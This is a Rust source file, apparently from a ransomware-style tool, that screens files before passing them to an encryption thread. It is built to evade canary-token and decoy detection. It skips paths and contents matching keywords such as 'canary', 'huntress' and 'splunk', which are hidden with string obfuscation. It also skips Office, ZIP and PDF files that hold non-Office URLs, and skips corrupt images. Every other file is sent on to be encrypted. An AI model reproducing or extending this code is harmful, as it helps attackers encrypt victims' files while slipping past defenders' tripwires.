use std::{
    fs::File,
    io::Read,
    path::PathBuf,
    sync::Arc,
    thread,
};
use regex::Regex;
use crossbeam_channel::{Sender, Receiver};
use lazy_static::lazy_static;
use log::{debug, error, info, warn};
use zip::read::ZipArchive;

use coconut_crab_lib::file::{get_file_data, get_file_size, get_lowercase_extension};
use crate::img::img_from_bytes;

macro_rules! litcrypt_array {
    ($($x:expr),*) => ([$(lc!($x)),*]);
}

lazy_static! {
    static ref INTERESTING_STRING_REGEX: Regex = Regex::new(r#"[A-Za-z0-9:./-]{6,}"#).expect("Invalid Regex");
    static ref LOOSE_URL_REGEX: Regex = Regex::new(r"https?://(?:[^.]+\.+)*([^.]+\.[^./]+)").expect("Invalid Regex");
    static ref SUSPICIOUS_KEYWORDS: [String; 9] = litcrypt_array!("canary", "canaries", "huntress", "exampleit", "splunk", "stressboi", "james brodsky", "ransomware", "nccgroup");
}

const OFFICE_FILE_DOMAINS: [&str; 4] = ["microsoft.com", "openxmlformats.org", "w3.org", "purl.org"];
const OFFICE_ZIP_EXTENSIONS: [&str; 4] = ["zip", "docx", "xlsx", "pptx"];
const IMAGE_EXTENSIONS: [&str; 15] = ["bmp", "dds", "ff", "gif", "hdr", "ico", "jpg", "jpeg", "exr", "png", "pnm", "qoi", "tga", "tiff", "tif"];
const MAX_IMAGE_SIZE_MB: u64 = 2;
const MAX_FILE_SIZE_KB: u64 = 1024;

pub fn filter_canary(receiver: Receiver<Arc<PathBuf>>, sender: Sender<Arc<PathBuf>>, avoid_keywords: Arc<bool>, avoid_urls: Arc<bool>, avoid_broken_images: Arc<bool>, analyze_office_zip: Arc<bool>, analyze_pdf: Arc<bool>) -> thread::JoinHandle<()> {
    debug!("Starting encryption crypto thread");
    thread::spawn(move || {
        loop {
            let file_path = match receiver.recv() {
                Ok(file_path_result) => {
                    debug!("Received file path over channel: {:?}", file_path_result);
                    file_path_result
                },
                Err(file_path_result) => {
                    warn!("Error receiving file path over channel: {}", file_path_result);
                    return
                },
            };

            if analyze_keywords(&file_path.to_string_lossy()) {
                info!("File path contained keyword: {:?}", file_path);
                continue;
            }

            let lowercase_extension = get_lowercase_extension(file_path.as_ref());
            if *analyze_pdf && lowercase_extension == "pdf" {
                debug!("Analyzing file as a PDF: {:?}", file_path);

                let file_data = match get_file_data(&file_path, &(MAX_FILE_SIZE_KB * 1024)) {
                    Ok(source_file_result) => {
                        debug!("No error during file data retrieval {:?}", file_path);
                        source_file_result
                    },
                    Err(source_file_result) => {
                        error!("Error during file data retrieval: {:?}", source_file_result);
                        info!("Not sending file for encryption: {:?}", file_path);
                        continue;
                    }
                };

                let some_file_data = match file_data {
                    Some(some_file_data_result) => {
                        some_file_data_result
                    },
                    None => {
                        debug!("File size is above maximum analysis size: {:?}", file_path);
                        match sender.send(file_path.clone()) {
                            Ok(_) => {
                                debug!("Successfully sent path to encryption thread: {:?}", file_path);
                            },
                            Err(send_result) => {
                                error!("Failed to send path to encryption thread: {}", send_result);
                            }
                        }
                        continue;
                    }
                };

                if analyze_file_data(&some_file_data, &avoid_keywords, &avoid_urls) {
                    info!("File flagged by analysis. Not sending file for encryption: {:?}", file_path);
                } else {
                    match sender.send(file_path.clone()) {
                        Ok(_) => {
                            debug!("Successfully sent path to encryption thread: {:?}", file_path);
                        },
                        Err(send_result) => {
                            error!("Failed to send path to encryption thread: {}", send_result);
                        }
                    }
                }
            } else if *analyze_office_zip && OFFICE_ZIP_EXTENSIONS.contains(&lowercase_extension.as_str()) {
                debug!("Analyzing file as a ZIP or Office document: {:?}", file_path);
                match get_file_size(&file_path) {
                    Ok(file_size_result) => {
                        if file_size_result > MAX_FILE_SIZE_KB * 1024 {
                            debug!("File size ({}) is above maximum analysis size ({}): {:?}", file_size_result, MAX_FILE_SIZE_KB * 1024, file_path);
                            match sender.send(file_path.clone()) {
                                Ok(_) => {
                                    debug!("Successfully sent path to encryption thread: {:?}", file_path);
                                },
                                Err(send_result) => {
                                    error!("Failed to send path to encryption thread: {}", send_result);
                                }
                            }
                        }
                    },
                    Err(_) => {
                        info!("Not sending file for encryption: {:?}", file_path);
                        continue;
                    }
                }

                match analyze_zip_file(&file_path, &(MAX_FILE_SIZE_KB * 1024), &avoid_keywords, &avoid_urls) {
                    Ok(analyze_zip_file_result) => {
                        if analyze_zip_file_result {
                            info!("File flagged by analysis. Not sending file for encryption: {:?}", file_path);
                        } else {
                            match sender.send(file_path.clone()) {
                                Ok(_) => {
                                    debug!("Successfully sent path to encryption thread: {:?}", file_path);
                                },
                                Err(send_result) => {
                                    error!("Failed to send path to encryption thread: {}", send_result);
                                }
                            }   
                        }
                    },
                    Err(_) => {
                        info!("Not sending file for encryption: {:?}", file_path);
                        continue;
                    }
                }

            } else if *avoid_broken_images && IMAGE_EXTENSIONS.contains(&lowercase_extension.as_str()) {

                let file_data = match get_file_data(&file_path, &(MAX_IMAGE_SIZE_MB * 1024 * 1024)) {
                    Ok(source_file_result) => {
                        debug!("No error during file data retrieval {:?}", file_path);
                        source_file_result
                    },
                    Err(source_file_result) => {
                        error!("Error during file data retrieval: {:?}", source_file_result);
                        info!("Not sending file for encryption: {:?}", file_path);
                        continue;
                    }
                };

                let some_file_data = match file_data {
                    Some(some_file_data_result) => {
                        some_file_data_result
                    },
                    None => {
                        debug!("File size is above maximum analysis size: {:?}", file_path);
                        match sender.send(file_path.clone()) {
                            Ok(_) => {
                                debug!("Successfully sent path to encryption thread: {:?}", file_path);
                            },
                            Err(send_result) => {
                                error!("Failed to send path to encryption thread: {}", send_result);
                            }
                        }
                        continue;
                    }
                };

                match img_from_bytes(&some_file_data) {
                    Ok(_) => {
                        match sender.send(file_path.clone()) {
                            Ok(_) => {
                                debug!("Successfully sent path to encryption thread: {:?}", file_path);
                            },
                            Err(send_result) => {
                                error!("Failed to send path to encryption thread: {}", send_result);
                            }
                        }
                    },
                    Err(_) => {
                        info!("Not sending file for encryption: {:?}", file_path);
                        continue;
                    }
                }
            }
        }
    })
}

fn analyze_file_data(file_data: &Vec<u8>, avoid_keywords: &bool, avoid_urls: &bool) -> bool {
    let interesting_strings = get_interesting_strings(&file_data);
    for interesting_string in interesting_strings {
        if *avoid_keywords && analyze_keywords(&interesting_string) {
            return true;
        }
        if *avoid_urls && analyze_urls(&interesting_string) {
            return true;
        }
    }
    return false;
}

fn get_interesting_strings(file_data: &[u8]) -> Vec<String> {
    let file_data_utf8 = String::from_utf8_lossy(file_data);
    return INTERESTING_STRING_REGEX.find_iter(&file_data_utf8).map(|regex_match| regex_match.as_str().to_string()).collect();
}

fn analyze_keywords(string: &str) -> bool {
    let lowercase_string = string.to_lowercase();
    for suspicious_keyword in SUSPICIOUS_KEYWORDS.iter() {
        if lowercase_string.contains(suspicious_keyword) {
            info!("String ({}) flagged by analysis due to keyword: {}", string, suspicious_keyword);
            return true;
        }
    }
    debug!("String not flagged by analysis: {}", string);
    return false;
}

fn analyze_urls(string: &str) -> bool {
    for (_url, [domain]) in LOOSE_URL_REGEX.captures_iter(string).map(|regex_capture| regex_capture.extract()) {
        if analyze_domain(domain) {
            info!("URL flagged by analysis due to domain: {}", domain);
            return true;
        }
    }
    debug!("URL not flagged by analysis");
    return false;
}

fn analyze_domain(domain: &str) -> bool {
    if !OFFICE_FILE_DOMAINS.contains(&domain) {
        debug!("Domain not a known office document domain: {}", domain);
        return true
    }
    debug!("Domain is a known office document domain: {}", domain);
    return false;
}

fn analyze_zip_file(file_path: &PathBuf, zipped_file_max_size: &u64, avoid_keywords: &bool, avoid_urls: &bool) -> Result<bool, ()> {
    let file = match File::open(file_path) {
        Ok(file_result) => {
            debug!("Successfuly opened source file: {:?}", file_path);
            file_result
        },
        Err(file_result) => {
            error!("Error opening source file: {:?}", file_result);
            return Err(());
        }
    };

    let mut archive = match ZipArchive::new(file) {
        Ok(archive_result) => {
            debug!("Successfuly opened file as zip archive: {:?}", file_path);
            archive_result
        },
        Err(archive_result) => {
            error!("Error opening file as zip archive: {:?}", archive_result);
            return Err(());
        }
    };
    
    debug!("Zip archive contains {} files", archive.len());
    for zipped_file_num in 0..archive.len() {

        let mut zipped_file = match archive.by_index(zipped_file_num) {
            Ok(zipped_file_result) => {
                debug!("Successfuly opened zipped file: {:?}", zipped_file_result.name());
                zipped_file_result
            },
            Err(zipped_file_result) => {
                error!("Error opening zipped file: {:?}", zipped_file_result);
                return Err(());
            }
        };

        if zipped_file.size() <= *zipped_file_max_size {
            debug!("Zipped file size ({}) is below max analysis size ({})", zipped_file.size(), zipped_file_max_size);

            let mut zipped_file_data = Vec::new();
            match zipped_file.read_to_end(&mut zipped_file_data){
                Ok(zipped_file_data_result) => {
                    debug!("Successfuly read {} bytes from zipped file: {}", zipped_file_data_result, zipped_file.name());  
                },
                Err(zipped_file_data_result) => {
                    error!("Error reading zipped file: {}", zipped_file_data_result);
                    return Err(());
                }
            }

            if analyze_file_data(&zipped_file_data, avoid_keywords, avoid_urls) {
                info!("Zipped file flagged by analysis: {}", zipped_file.name());
                return Ok(true);
            }

        } else {
            debug!("Zipped file size ({}) is above max analysis size ({})", zipped_file.size(), zipped_file_max_size);
        }
    }
    debug!("Zip archive not flagged by analysis: {:?}", file_path);
    return Ok(false);
}
